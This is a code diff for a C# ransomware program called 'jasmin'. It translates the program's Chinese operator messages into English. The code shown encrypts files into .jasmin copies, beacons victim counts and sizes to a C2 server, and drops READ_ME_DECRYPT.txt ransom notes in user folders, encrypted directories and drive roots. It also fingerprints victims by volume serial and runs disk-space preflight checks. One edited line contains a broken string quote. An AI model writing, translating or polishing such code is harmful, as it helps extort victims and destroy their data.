@@ -54,9 +54,9 @@ static void ReportFails(){
   if(FAILS.Count==0)return;
   try{
     int tot=0;foreach(var kv in FAILS)tot+=kv.Value;
-    Console.Error.WriteLine("[jasmin] !!! 有 "+tot+" 处操作失败，原因统计:");
-    foreach(var kv in FAILS)Console.Error.WriteLine("[jasmin] !!!   "+kv.Value+" 次 — "+kv.Key);
-    Console.Error.WriteLine("[jasmin] !!! 自查: 磁盘剩余空间、分区是否只读/写保护、文件权限、路径长度");
+    Console.Error.WriteLine("[jasmin] !!! "+tot+" operation(s) failed. Reason breakdown:");
+    foreach(var kv in FAILS)Console.Error.WriteLine("[jasmin] !!!   "+kv.Value+" time(s) - "+kv.Key);
+    Console.Error.WriteLine("[jasmin] !!! Check: free disk space, whether the volume is read-only/write-protected, file permissions, path length");
   }catch{}
 }
 
@@ -77,14 +77,14 @@ static bool Enc(string path){
     return true;
   }catch(Exception ex){
     string w;
-    if(ex is UnauthorizedAccessException)w="权限不足 (UnauthorizedAccessException) — 无法写入该目录";
-    else if(ex is PathTooLongException)w="路径过长 (PathTooLongException)";
-    else if(ex is System.IO.DirectoryNotFoundException)w="目录不存在 (DirectoryNotFoundException)";
+    if(ex is UnauthorizedAccessException)w="Access denied (UnauthorizedAccessException) - cannot write to that directory";
+    else if(ex is PathTooLongException)w="Path too long (PathTooLongException)";
+    else if(ex is System.IO.DirectoryNotFoundException)w="Directory not found (DirectoryNotFoundException)";
     else if(ex is System.IO.IOException){
       string m=ex.Message;
       if(m.IndexOf("space",StringComparison.OrdinalIgnoreCase)>=0||m.IndexOf("磁盘空间")>=0)
-        w="磁盘空间不足 (IOException) — 加密需为每个文件额外生成等大的 .jasmin，需要与被加密数据等量的空闲空间";
-      else w="IO错误 (IOException): "+m;
+        w="Insufficient disk space (IOException) - each file needs an equally sized .jasmin copy; free space equal to the target data is required";
+      else w="IO error (IOException): "+m;
     }
     else w=ex.GetType().Name+": "+ex.Message;
     NoteFail(w);
@@ -157,9 +157,9 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
       new("total_size",(totalSz>0?totalSz:sz).ToString())};
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
   }catch(Exception ex){if(P_CONSOLE){try{
-    Console.Error.WriteLine("[jasmin] !!! 上报失败: "+C2);
+    Console.Error.WriteLine("[jasmin] !!! Beacon failed: "+C2);
     Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
-    Console.Error.WriteLine("[jasmin] !!! 请检查回连地址、端口(本服务在 :8080)、握手密钥");
+    Console.Error.WriteLine("[jasmin] !!! Check the C2 URL, the port (this service listens on :8080), and the handshake secret");
   }catch{}}}}
 
 static string SID="";
@@ -177,13 +177,13 @@ static void DropNotes(){
     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
   foreach(string d in dirs){
-    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("勒索信投放失败(磁盘满/只读/权限): "+ex.GetType().Name);}}
+    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
   // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
   foreach(string d in NOTE_DIRS){
-    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("勒索信投放失败(磁盘满/只读/权限): "+ex.GetType().Name);}}
+    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
   foreach(DriveInfo dr in DriveInfo.GetDrives()){
-    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch(Exception ex){NoteFail("勒索信投放失败(盘符根/只读): "+ex.GetType().Name);}}
-  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 勒索信已投放 "+wrote+" 处");}catch{}}
+    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch(Exception ex){NoteFail("Ransom note drop failed (drive root / read-only): "+ex.GetType().Name);}}
+  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Ransom note dropped in "+wrote+" location(s)");}catch{}}
 }
 
 // ── 预扫描：只统计数量与总字节，不保存路径列表 ──
@@ -205,7 +205,7 @@ static void Preflight(){
         if(!dr.IsReady)continue;
         long need=P_TOTAL_BYTES;
         if(need>0&&dr.AvailableFreeSpace<need+need/20){
-          if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! 空间预检警告: "+dr.Name+" 可用 "+FmtB(dr.AvailableFreeSpace)+" < 需要约 "+FmtB(need)+"（加密需为每个文件额外生成等大的 .jasmin，空间不足会大面积失败）");
+          if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! Preflight warning: "+dr.Name+" has "+FmtB(dr.AvailableFreeSpace)+" free < ~"+FmtB(need)+" required (each file needs an equally sized .jasmin copy; insufficient space causes widespread failures)");
         }
       }catch{}
     }
@@ -217,7 +217,7 @@ static void Main(){
     foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
 
   ScanTargets();
-  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 发现 "+P_TOTAL+" 个目标文件，合计 "+FmtB(P_TOTAL_BYTES));}catch{}}
+  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Found "+P_TOTAL+" target file(s), "+FmtB(P_TOTAL_BYTES)+" total);}catch{}}
   Preflight();
 
   long encCount=0,encSize=0;
@@ -243,7 +243,7 @@ static void Main(){
         }));
       }}catch{}}}catch{}}
   System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
-  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] 加密完成: "+encCount+"/"+P_TOTAL+" 个文件, "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
+  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] Encryption complete: "+encCount+"/"+P_TOTAL+" file(s), "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
   ReportFails();
 
   DropNotes();
